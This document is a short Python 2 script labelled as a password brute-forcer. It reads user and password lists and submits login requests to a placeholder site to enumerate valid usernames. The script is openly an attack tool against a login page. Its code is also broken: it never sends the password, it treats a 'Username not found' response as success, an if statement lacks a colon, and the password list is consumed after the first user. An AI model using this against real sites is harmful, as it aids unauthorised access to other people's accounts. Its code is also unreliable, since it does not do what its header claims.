#brute force passwords
import sys
import urllib
import urllib2

if len(sys.argv) !=3:
    print "usage: %s userlist passwordlist" % (sys.argv[0])
    sys.exit(0)

filename1=str(sys.argv[1])
filename2=str(sys.argv[2])
userlist = open(filename1,'r')
passwordlist = open(filename2,'r')
url = "http://www.vulnerablesite.com/login.html"
foundusers = []
UnknownStr="Username not found"

for user in userlist:
	for password in passwordlist:
		data = urllib.urlencode({"username":user})
		request = urllib2.urlopen(url,data)
		response = request.read()
		if(response.find(UnknownStr)>=0)
			foundusers.append(user)
		request.close()

if len(foundusers)>0:
	print "Found Users:\n"
	for name in foundusers:
		print name+"\n"
else:
	print "No users found\n"

